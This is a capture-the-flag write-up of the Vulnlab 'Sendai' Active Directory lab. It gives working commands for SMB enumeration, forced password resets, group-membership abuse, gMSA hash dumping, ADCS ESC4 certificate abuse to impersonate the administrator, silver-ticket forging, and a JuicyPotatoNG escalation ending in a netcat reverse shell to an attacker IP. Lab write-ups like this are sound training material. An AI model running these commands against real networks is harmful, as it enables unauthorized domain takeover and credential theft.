
# Vulnlab - Sendai

```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus           
80/tcp    open  http          Microsoft IIS httpd 10.0  
|_http-server-header: Microsoft-IIS/10.0
88/tcp open  kerberos-sec
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.sendai.vl
| Subject Alternative Name: DNS:dc.sendai.vl            
| Issuer: commonName=dc.sendai.vl                                     
|_http-server-header: Microsoft-IIS/10.0                
| http-methods:                                
|_  Supported Methods: GET
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=dc.sendai.vl
| Issuer: commonName=dc.sendai.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-05-04T16:24:01
| Not valid after:  2024-11-03T16:24:01
| MD5:   6198fc32527e478294e38fd5c6a2b81e
|_SHA-1: 73b4d1026b49e0cb9c0d633982377e74f32b7db3
|_ssl-date: 2024-05-05T16:28:56+00:00; -1m22s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  unknown
56740/tcp open  unknown
56744/tcp open  unknown
```

## PORT 80/443

<img src="https://i.imgur.com/2xyBd1B.png"/>
 
Running gobuster, we can find `/service`

<img src="https://i.imgur.com/41s7K0i.png"/>

However this endpoints shows that we don't have access to it

<img src="https://i.imgur.com/YgAmiLH.png"/>

## PORT 445

Enumerating smb shares with anonymous login, we'll see `config`, `sendai` and `Users` share, where config was not accessible, Users didn't anything but sendai had some interesting files

<img src="https://i.imgur.com/mQaCMNk.png"/>

<img src="https://i.imgur.com/OjZZNAR.png"/>

<img src="https://i.imgur.com/kSTgBfG.png"/>

The incident talked about users having weak passwords, all users will be prompted to change their password on logging in, the transfer directory had user's directories

<img src="https://i.imgur.com/Ob5kSkE.png"/>

## Resetting domain user's password

These users can also be enumerated through `lookupsid` by brute forcing sids

<img src="https://i.imgur.com/cNM7HDk.png"/>
On trying to login with null password, we'll get two users with password to be changed

<img src="https://i.imgur.com/bWjdAf4.png"/>
Password can be changed with `impacket-smbpasswd`

```bash
impacket-smbpasswd  sendai.vl/Thomas.Powell@dc.sendai.vl -newpass '$aduwu123'
```

<img src="https://i.imgur.com/2naixZH.png"/>

<img src="https://i.imgur.com/3NWYOCE.png"/>
From config share, we can grab `.sqlconfig` having credentials to MSSQL

<img src="https://i.imgur.com/iOaiZ2c.png"/>

<img src="https://i.imgur.com/oQ0cAH9.png"/>

But this service isn't exposed to us so moving on to enumerating the domain with bloodhound

```bash
python3 bloodhound.py -u sqlsvc -p password -d sendai.vl -c all -dc dc.sendai.vl -ns 10.10.104.41
```

<img src="https://i.imgur.com/JM5mhTv.png"/>

Thomas.Powell is a member of `Support` group has `GenericAll` on `ADMSVC` group which has `ReadGMSAPassword` on `MGTSVC$` account. We'll need to add thomas in ADMSVC group, read the NThash of MGTSVC account

<img src="https://i.imgur.com/BRPHbql.png"/>

## Abusing GenericAll and reading GMSA password

Through` bloodyAD` we can add thomas in ADMSVC group having genericall rights

```bash
 python3 bloodyAD.py  --host "10.10.104.41" -d 'sendai.vl' -u 'thomas.powell' -p '$aduwu123' add groupMember ADMSVC thomas.powell
```

<img src="https://i.imgur.com/cS1zoYy.png"/>

With gmsadumper script or with netexec we can dump the nthash of mgtsvc account

```bash
python3 gMSADumper.py -u 'thomas.powell' -p '$aduwu123' -d sendai.vl -l 10.10.104.41
```

<img src="https://i.imgur.com/ina1lCb.png"/>

This account can login on DC as it's part of `Remote Management` group

<img src="https://i.imgur.com/uwRvgKc.png"/>

Checking the privileges after logging in through evil-winrm, it doesn't have any privilege that we can abuse to get local admin

<img src="https://i.imgur.com/jxAX90R.png"/>

## Obtaining clifford's password

From the running process, we have helpdesk which doesn't normally run on a system

<img src="https://i.imgur.com/IxlngBF.png"/>

Enumerating the system with `PrivescCheck.ps1`

<img src="https://i.imgur.com/yO9Rckp.png"/>

This will list down the running processes from where we'll find the clifford.davey's creds

<img src="https://i.imgur.com/NPt3pB3.png|"/>

## Enumerating ADCS

This user belongs to `CA-Operators` group, so he likely will be able to enroll in a custom template, enumerating templates with `certipy`

<img src="https://i.imgur.com/Vgev4wX.png"/>

## Escalating privileges through ESC4

```bash
certipy find -u clifford.davey -vulnerable -target dc.sendai.vl -dc-ip 10.10.115.126 -stdout
```

This lists down a template `SendaiComputer` which has EKU set to `Client Authentication` that can be used to authenticate on the system and ca-operators group has Full control over this template which means we can edit this template and impersonate as the domain admin, which is known as ESC4 (access control) abuse

<img src="https://i.imgur.com/mQUF4HH.png"/>

<img src="https://i.imgur.com/A10lXkN.png"/>

With certipy, we can change the configuration of this template to allow domain users to enroll for this template and impersonate any user 

```bash
certipy template -u clifford.davey -target dc.sendai.vl -dc-ip 10.10.115.126 -template SendaiComputer
```

<img src="https://i.imgur.com/YycVHAi.png"/>
<img src="https://i.imgur.com/FEVEUWg.png"/>

```bash
certipy req -u 'clifford.davey' -ca 'sendai-DC-CA' -dc-ip 10.10.115.126 -target dc.sendai.vl -template 'SendaiComputer' -upn administrator
```

<img src="https://i.imgur.com/pCSgIFn.png"/>

```bash
certipy auth -pfx ./administrator.pfx -domain sendai.vl
```

<img src="https://i.imgur.com/vgGRaVx.png"/>

## Escalating with SeImpersonate privilege

Another way of escalating privileges is through mssql, since mssql is running internally, having access on the machine we can port forward with`chisel`

```bash
chisel server -p 2222 --reverse
chisel.exe client 10.8.0.136:2222 R:socks
```
<img src="https://i.imgur.com/hSVXA3l.png"/>

But we'll get login denied for sqlsvc account

<img src="https://i.imgur.com/7dUxhoi.png"/>

With `ticketer,` forging a silver ticket for accessing MSSQL service as an administrator

```bash
ticketer.py -domain-sid S-1-5-21-3085872742-570972823-736764132 -domain sendai.vl -spn MSSQL/dc.sendai.vl -nthash hash Administrator
```

<img src="https://i.imgur.com/iOKxMa4.png"/>

<img src="https://i.imgur.com/ZlBgszU.png"/>

Enabling `xp_cmdshell` which will allow us to execute system commands as sqlsvc

<img src="https://i.imgur.com/DDGiMXV.png"/>

The difference here is that we'll have `SeImpersonate` privilege, which can abuse to get local admin

<img src="https://i.imgur.com/CvG90gg.png"/>

<img src="https://i.imgur.com/tdEDy5t.png"/>

Using `juicypotato-ng` to abuse the privilege and get a shell a SYSTEM

```bash
.\JuicyPotatoNG.exe -t * -p "C:\Windows\system32\cmd.exe" -a "/c C:\Users\sqlsvc\nc.exe 10.8.0.136 4444 -e cmd.exe"
```

<img src="https://i.imgur.com/22805js.png"/>

# References

- https://exploit-notes.hdks.org/exploit/windows/active-directory/smb-pentesting/
- https://github.com/itm4n/PrivescCheck
- https://hideandsec.sh/books/cheatsheets-82c/page/active-directory-certificate-services
